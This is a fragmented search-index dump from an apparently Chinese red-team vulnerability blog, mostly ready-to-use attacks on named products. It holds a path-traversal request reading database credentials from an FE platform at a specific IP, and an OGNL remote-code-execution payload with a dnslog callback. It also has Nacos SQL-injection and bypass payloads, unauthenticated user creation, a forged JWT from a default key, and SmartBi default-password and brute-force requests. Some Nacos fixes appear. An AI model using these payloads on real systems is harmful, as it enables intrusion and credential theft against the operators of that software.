信息泄露漏洞","uri":"/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BA-web-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-excu_shell-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"青藤云 EDR 权限提升漏洞 青藤的测试 POC local function save_python_info(ctx, info_table) local proc_names = {\"python.exe\"} local procs_ret = ctx.get_proc_list_info_rely(ctx, proc_names) if next(procs_ret) == nil then return end -- call get version -- ... 省略无关代码 get_python_ver(proc) -- ... 省略无关代码 end function get_python_ver(proc) if proc == nil then return \"\" end if file_api.file_exists(proc.path) then local cmdline = \"\\\"\" .. proc.path .. \"\\\" -V\" local ret, output = common.execute_shell(cmdline) if ret == 0 and output and output ~= \"\" then return regex.match(output, \"\\\\d.+\\\\d\") else agent.error_log(\"get python version info error:\" .. tostring(ret)) return \"\" end end End ","date":"2023-12-08","objectID":"/%E9%9D%92%E8%97%A4%E4%BA%91-edr-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"青藤云 EDR 权限提升漏洞","uri":"/%E9%9D%92%E8%97%A4%E4%BA%91-edr-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"js39/flyrise.stopBackspace.js\" || body=\"src=\\\"/js39/flyrise.dialog.js\" || body=\"src=\\\"/js39/external/jquery\" ","date":"2023-12-08","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E6%96%87%E4%BB%B6-magepath-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"飞企互联 FE 业务协作平台 ShowImageServlet 文件 magePath 参数文件读取漏洞","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E6%96%87%E4%BB%B6-magepath-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc GET /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties\u0026print HTTP/1.1 Host: 110.53.162.145:9090 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E6%96%87%E4%BB%B6-magepath-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"飞企互联 FE 业务协作平台 ShowImageServlet 文件 magePath 参数文件读取漏洞","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E6%96%87%E4%BB%B6-magepath-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"js39/flyrise.stopBackspace.js\" || body=\"src=\\\"/js39/flyrise.dialog.js\" || body=\"src=\\\"/js39/external/jquery\" ","date":"2023-12-08","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"飞企互联 FE 业务协作平台 后台任意文件上传","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"poc /fe.do?SYS.ID=891-004-000\u0026SYS.ACTION=init /FEbrithdaycard/202306180851357246.jpeg ","date":"2023-12-08","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw"],"title":"飞企互联 FE 业务协作平台 后台任意文件上传","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"飞企互联 FE 业务协作平台存在参数文件读取漏洞 ","date":"2023-12-08","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"飞企互联 FE 业务协作平台存在参数文件读取漏洞 ","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"飞企互联-FE企业运营管理平台\" ","date":"2023-12-08","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"飞企互联 FE 业务协作平台存在参数文件读取漏洞 ","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties\u0026print ","date":"2023-12-08","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"飞企互联 FE 业务协作平台存在参数文件读取漏洞 ","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"影响版本:version \u003c= 6.6.0\rPOST /common/common_sort_tree.jsp;.js HTTP/1.1 Host: 110.53.162.145:9090 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=6FFADE422CCC53EF93E250BD6FDFDC52 Connection: close Content-Length: 81 rootName={%Thread.@java.lang.Runtime@getRuntime().exec('ping jv02f8.dnslog.cn')%} ","date":"2023-12-08","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%BC%81%E4%B8%9A%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-common_sort_tree.jsp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"飞企互联 FE 企业运营管理平台 common_sort_tree.jsp远程代码执行漏洞","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe-%E4%BC%81%E4%B8%9A%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-common_sort_tree.jsp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Nacos 漏洞 Checklist ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:0:0","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"一、前置知识 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:1:0","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x01 Nacos 概述 Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:1:1","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"二、默认口令登录 Nacos 默认帐户名密码： nacos/nacos ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:2:0","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"三、可能存在的未授权 API ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:3:0","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x01 用户信息 API /nacos/v1/auth/users?pageNo=1\u0026pageSize=9 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:3:1","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x02 集群信息 API /nacos/v1/core/cluster/nodes?withInstances=false\u0026pageNo=1\u0026pageSize=10\u0026keyword= ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:3:2","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x03 配置信息 API /nacos/v1/cs/configs?dataId=\u0026group=\u0026appName=\u0026config_tags=\u0026pageNo=1\u0026pageSize=9\u0026tenant=\u0026search=accurate\u0026accessToken=\u0026username= 这一接口在未授权的情况下可能会暴露 Spring、MySQL、Redis、Druid 等配置信息，若存在云环境、文件系统，还可能暴露 accessKey、secretKey 等。 获取配置信息示例： 获取ak、sk 示例： 如果返回为 403 Forbidden，可以尝试 CNVD-2023674205 漏洞绕过限制。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:3:3","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"四、SQL 注入风险 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:4:0","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞描述 Nacos config server 中有未鉴权接口，执行 SQL 语句可以查看敏感数据，可以执行任意的 SELECT 查询语句。 漏洞点位于 nacos-config 的com.alibaba.nacos.config.server.controller.ConfigOpsController。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:4:1","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞影响 使用derby数据库进行部署的Nacos ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:4:2","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞复现 poc： /nacos/v1/cs/ops/derby?sql=select+*+from+sys.systables /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st 一些查询语句： select * from users select * from permissions select * from roles select * from tenant_info select * from tenant_capacity select * from group_capacity select * from config_tags_relation select * from app_configdata_relation_pubs select * from app_configdata_relation_subs select * from app_list select * from config_info_aggr select * from config_info_tag select * from config_info_beta select * from his_config_info select * from config_info Bypass payload： /nacos/v1/cs/ops/derby?sql=SELECT--/dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad\u0026sql=/%0a*--/%25\u0026q=dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad%\u0026sql=%0afrom--/\u0026sql=/%0ausers ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:4:3","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"五、认证绕过/用户创建 CVE-2021-29441 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:5:0","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞描述 2020 年 12 月 29 日披露。在 Nacos 进行认证授权操作时，会判断请求的 User-Agent 是否为 ”Nacos-Server”，如果是的话则不进行任何认证。该配置为硬编码，通过该漏洞，攻击者可以获取到用户名密码等敏感信息，且可以进行任意操作，包括创建新用户并进行登录后操作。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:5:1","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"影响版本 Nacos \u003c= 2.0.0-ALPHA.1 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:5:2","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞复现 访问 /nacos/v1/auth/users?pageNo=1\u0026pageSize=9 ，查看状态码是否为 200，且内容中是否包含 pageItems。通过该路由可查询 IP 地址、Nacos 端口、Nacos 版本、raftPort 等信息： http://your-ip:port/nacos/v1/core/cluster/nodes?withInstances=false\u0026pageNo=1\u0026pageSize=10\u0026keyword= 通过 /nacos/v1/auth/users 路由查询已有的用户列表及敏感信息： http://your-ip:port/nacos/v1/auth/users?pageNo=1\u0026pageSize=9 此处需要注意，大部分企业的 Nacos 的 URL 为 /v1/auth/users ，而不是默认的 /nacos/v1/auth/users，即： /v1/core/cluster/nodes?withInstances=false\u0026pageNo=1\u0026pageSize=10\u0026keyword= /v1/auth/users?pageNo=1\u0026pageSize=9 尝试以 POST 方式创建新用户（whoami/whoami）： POST /v1/auth/users HTTP/1.1 username=whoami\u0026password=whoami 查看刚才创建的新用户，使用添加的新用户（whoami/whoami）进行登录： GET /nacos/v1/auth/users?pageNo=1\u0026pageSize=9 HTTP/1.1 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:5:3","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"修复建议 修改 Nacos 的 application.properties 配置文件，开启服务身份识别功能，配置后访问 /nacos/v1/auth/users/?pageNo=1\u0026pageSize=9 路由将返回 403 Forbidden。 # 开启鉴权 nacos.core.auth.enabled=true nacos.core.auth.enable.userAgentAuthWhite=false nacos.core.auth.server.identity.key=YOUR-KEY nacos.core.auth.server.identity.value=YOUR-VALUE Nacos 注册及配置中心开启权限认证，编辑项目中的 bootstrap.yml 或 bootstrap.properties，修改 discovery 和 config 开启用户密码认证（用户名和密码不能带有 %、$ 等会被转义的特殊字符）。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:5:4","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"六、secret.key 默认密钥 CNVD-2023674205 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:6:0","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞描述 2023 年 3 月 2 日披露。Alibaba Nacos 使用了固定的 secret.key 默认密钥，导致攻击者可以构造请求获取敏感信息，导致未授权访问漏洞。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:6:1","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞影响 Alibaba Nacos \u003c= 2.2.0 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:6:2","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞复现 在配置文件 conf/application.properties 中，默认硬编码 nacos.core.auth.plugin.nacos.token.secret.key 的值。 nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 Nacos 使用 jwt token，算法为 HS256，将 secret.key 的默认值当作 secretKey，生成Signature。jwt token 的 Payload 为 subject（用户名）和 exp（有效期）。 我们伪造一个 jwt token，Payload： { \"sub\": \"nacos\", \"exp\": 1696669333 } 伪造的 jwt token： eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5OTg4ODc3N30.bYEColBVGkF-H-kGr9PxWnbmZZp66z77NXUNHXZbbnw 进行验证，没有配置 jwt token 时，返回 403 Forbidden： GET /v1/cs/configs?dataId=\u0026group=\u0026appName=\u0026config_tags=\u0026pageNo=1\u0026pageSize=9\u0026tenant=\u0026search=accurate\u0026accessToken=\u0026username= HTTP/1.1 Host: your-ip Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5OTg4ODc3N30.bYEColBVGkF-H-kGr9PxWnbmZZp66z77NXUNHXZbbnw 修改 Authorization头，配置 jwt token，返回 200 OK： Authorization: Bearer \u003cjwt token\u003e ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:6:3","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞修复 修改生成 Token 的 secret.key，推荐自定义密钥时，将配置项设置为 Base64 编码的字符串，且原始密钥长度不得低于 32 字符。 #启用认证 nacos.core.auth.enabled=true #生成 Token 的密钥 nacos.core.auth.plugin.nacos.token.secret.key=base64编码 升级到2.2.0.1及之后版本。Nacos官方在2023.03.02发布了2.2.0.1，下载地址：https://github.com/alibaba/nacos/releases/tag/2.2.0.1，最新版本：https://github.com/alibaba/nacos/releases。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:6:4","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"七、identity.key/value 默认值认证绕过 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:7:0","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞描述 当开启 Nacos 权限认证（nacos.core.auth.enabled=true）后，配置文件中存在默认值： nacos.core.auth.server.identity.key=serverIdentity nacos.core.auth.server.identity.value=security 该硬编码导致攻击者可以构造携带该 key 和 value 的请求，从而绕过权限认证。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:7:1","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞影响 Nacos \u003c= 2.2.0 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:7:2","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞复现 POST /v1/auth/users HTTP/1.1 serverIdentity: security username=whoami\u0026password=whoami 当开启 Nacos 权限认证（nacos.core.auth.enabled=true）后，必须填写 nacos.core.auth.server.identity.key 和 nacos.core.auth.server.identity.value 才能够正常启动。若 serverIdentity: security 无法绕过，可以尝试以下键值对： 官网示例中的键值对 example:example 搜索引擎解决方案中出现最多的键值对 test:test ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:7:3","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞修复 配置自定义身份识别的 key（不可为空）和 value（不可为空）： nacos.core.auth.server.identity.key=example nacos.core.auth.server.identity.value=example 升级最新版本：https://github.com/alibaba/nacos/releases。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:7:4","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"八、Nacos 集群 Raft 反序列化漏洞 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:8:0","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞描述 Nacos 在处理某些基于 Jraft 的请求时，采用 Hessian 进行反序列化，但并未设置限制，导致应用存在远程代码执行（RCE）漏洞。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:8:1","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞影响 1.4.0 \u003c= Nacos \u003c 1.4.6 使用cluster集群模式运行 2.0.0 \u003c= Nacos \u003c 2.2.3 任意模式启动 Nacos 1.x 在单机模式下默认不开放 7848 端口，故该情况通常不受此漏洞影响。Nacos 2.x 版本无论单机或集群模式均默认开放 7848 端口。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:8:2","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞复现 exp： https://github.com/c0olw/NacosRce/ ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:8:3","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"漏洞修复 通用修补建议 目前官方已发布安全修复更新，受影响用户可以升级到Nacos 1.4.6、Nacos 2.2.3： https://github.com/alibaba/nacos/releases/tag/1.4.6 https://github.com/alibaba/nacos/releases/tag/2.2.3 临时修补建议 对外限制开放7848端口，一般使用时该端口为Nacos集群间Raft协议的通信端口，不承载客户端请求，因此老版本可以通过禁止该端口来自Nacos集群外的请求达到止血目的（如部署时已进行限制或未暴露，则风险可控）。 ","date":"0001-01-01","objectID":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/:8:4","tags":null,"title":"","uri":"/nacos-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"SmartBi 漏洞 Checklist ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:0:0","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"一、前置知识 ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:1:0","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x01 SmartBi 概述 Smartbi 是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI 智能分析等大数据分析需求。该软件应用范围较广，据官网介绍，在全球财富 500 强的 10 家国内银行，有 8 家选用了 Smartbi。 ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:1:1","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x02 FOFA指纹 app=\"SMARTBI\" ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:1:2","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x03 登录入口 https://127.0.0.1/vision/mobileportal.jsp https://127.0.0.1/vision/mobileX/login https://127.0.0.1/vision/index.jsp https://127.0.0.1/smartbi/vision/index.jsp 密码正确的情况下，部分平台无法登陆，此时设置user-agent为手机端就可以。 ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:1:3","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x04 常见口令 demo/demo manager/demo admin/admin admin/manager admin/2manager ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:1:4","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"二、认证漏洞 ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:2:0","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x01 登录爆破 POST /vision/RMIServlet HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://127.0.0.1/vision/mobileX/login content-type: application/x-www-form-urlencoded Content-Length: 70 Authorization: Basic YWRtaW46YWRtaW4= Connection: close Cookie: JSESSIONID=1DA1DAA51469E646F97AD829F29A2B15 className=UserService\u0026methodName=login\u0026params=[\"admin\",\"admin\"] 抓取 true/false 字段。 ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:2:1","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x02 401认证弱口令 /vision 目录下的文件都需要 401 认证： admin/admin admin/manager admin/2manager mining/admin demo/demo manager/demo manager/admin user/admin test/admin huanan/admin 不论用户名输什么，只要密码正确即可。 ","date":"0001-01-01","objectID":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/:2:2","tags":null,"title":"","uri":"/smartbi-%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"三、信息泄露 